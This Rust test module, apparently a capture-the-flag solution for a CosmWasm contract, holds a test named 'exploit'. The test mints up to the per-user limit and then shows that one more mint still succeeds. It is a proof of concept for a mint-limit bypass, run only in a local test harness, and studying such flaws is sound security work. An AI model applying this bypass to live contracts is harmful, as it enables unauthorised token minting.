#[cfg(test)]
pub mod tests {
    use cosmwasm_std::Addr;
    use cw_multi_test::Executor;

    use crate::{
        integration_tests::tests::{proper_instantiate, USER1},
        msg::{ExecuteMsg, QueryMsg},
        state::Config,
    };

    pub const ATTACKER: &str = "awesomwasm";

    #[test]
    fn exploit() {
        let mint_per_user = 20;
        let (mut app, contract_addr) = proper_instantiate(mint_per_user);

        let config: Config = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Config {})
            .unwrap();
        assert_eq!(config.mint_per_user, mint_per_user);

        // mint until max limit
        for _ in 0..config.mint_per_user {
            app.execute_contract(
                Addr::unchecked(USER1),
                contract_addr.clone(),
                &ExecuteMsg::Mint {},
                &[],
            )
            .unwrap();
        }

        // can still mint over limit
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[],
        )
        .unwrap();
    }
}
